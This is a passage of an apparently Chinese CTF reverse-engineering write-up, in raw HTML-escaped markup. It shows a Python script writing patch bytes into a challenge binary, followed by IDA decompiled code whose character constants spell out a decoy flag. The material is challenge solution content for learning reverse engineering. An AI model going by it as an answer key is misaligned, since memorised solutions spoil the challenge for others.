fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\xc0\x01\xd0\x01\xc0\x89\xc2\x8b\x45\xf4\x01\xd0\x8d\x14\x0e&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x48\x98\x89\x94\x85\x50\xff\xff\xff\x83\x45\xf0\x01\x83\x7d\xf0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x05\x0f\x8e\x71\xff\xff\xff\x83\x45\xf4\x01\x83\x7d\xf4\x05\x0f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8e\x57\xff\xff\xff\x83\x45\xf8\x01\x83\x7d\xf8\x05\x0f\x8e\x3d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\xc7\x45\xec\x00\x00\x00\x00\xeb\x58\xc7\x45\xe8\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\xeb\x45\x8b\x55\xec\x89\xd0\x01\xc0\x01\xd0\x01\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xc2\x8b\x45\xe8\x01\xd0\x48\x98\x8b\x8c\x85\x50\xff\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8b\x55\xec\x89\xd0\x01\xc0\x01\xd0\x01\xc0\x89\xc2\x8b\x45\xe8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\xd0\x48\x98\x8b\x84\x85\xc0\xfe\xff\xff\x39\xc1\x74\x07\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x45\xfc\x00\x00\x00\x00\x83\x45\xe8\x01\x83\x7d\xe8\x05\x7e\xb5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x83\x45\xec\x01\x83\x7d\xec\x05\x7e\xa2\x8b\x45\xfc\xc9\xc3\x45&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xec\x38\xc3\xc0\x38\x8b\x00\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
fr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;step-3查看修改后的代码&#34;&gt;step 3：查看修改后的代码&lt;/h3&gt;
&lt;p&gt;使用ida64打开修改后的文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; __usercall sub_401216&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;rbp&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a2&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;)
{
  v54 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2;
  memset(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v47, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90uLL&lt;/span&gt;);
  v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55030&lt;/span&gt;;
  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61095&lt;/span&gt;;
  v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60151&lt;/span&gt;;
  v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57247&lt;/span&gt;;
  v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56780&lt;/span&gt;;
  v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55726&lt;/span&gt;;
  v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46642&lt;/span&gt;;
  v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52931&lt;/span&gt;;
  v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53580&lt;/span&gt;;
  v20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50437&lt;/span&gt;;
  v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50062&lt;/span&gt;;
  v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44186&lt;/span&gt;;
  v23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44909&lt;/span&gt;;
  v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46490&lt;/span&gt;;
  v25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46024&lt;/span&gt;;
  v26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44347&lt;/span&gt;;
  v27 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43850&lt;/span&gt;;
  v28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44368&lt;/span&gt;;
  v29 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54990&lt;/span&gt;;
  v30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61884&lt;/span&gt;;
  v31 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61202&lt;/span&gt;;
  v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58139&lt;/span&gt;;
  v33 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57730&lt;/span&gt;;
  v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54964&lt;/span&gt;;
  v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48849&lt;/span&gt;;
  v36 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51026&lt;/span&gt;;
  v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49629&lt;/span&gt;;
  v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48219&lt;/span&gt;;
  v39 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47904&lt;/span&gt;;
  v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50823&lt;/span&gt;;
  v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46596&lt;/span&gt;;
  v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50517&lt;/span&gt;;
  v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48421&lt;/span&gt;;
  v44 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46143&lt;/span&gt;;
  v45 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46102&lt;/span&gt;;
  v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46744&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;;

  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v54 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;;
